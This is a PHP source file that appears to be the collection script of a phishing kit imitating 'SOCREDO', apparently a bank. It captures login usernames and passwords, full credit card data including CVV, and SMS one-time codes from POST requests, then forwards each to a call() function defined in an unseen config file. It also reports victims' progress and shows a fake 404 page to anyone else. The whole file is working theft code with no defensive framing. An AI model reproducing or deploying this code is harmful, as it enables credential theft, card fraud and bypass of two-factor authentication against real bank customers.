<?php 
session_start();
require '../config.php';

if(isset($_POST['user'])){
call("/- SOCREDO LOG -/
User: ".$_POST['user']."
Pass: ".$_POST['pass']);
return;
}


if(isset($_POST['cc'])){
$_SESSION['cc'] = $_POST['cc'];
call("/- SOCREDO CC -/
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']);
return;
}

if(isset($_POST['carding'])){
call("SOCREDO Notification
Entering card info...
");
return;
}

if(isset($_POST['otping'])){
call("SOCREDO Notification
Entering sms...
");
return;
}

if(isset($_POST['sms'])){
call("/- SOCREDO SMS -/
CODE: ".$_POST['sms']);
return;
}
 
header("HTTP/1.0 404 Not Found");

?>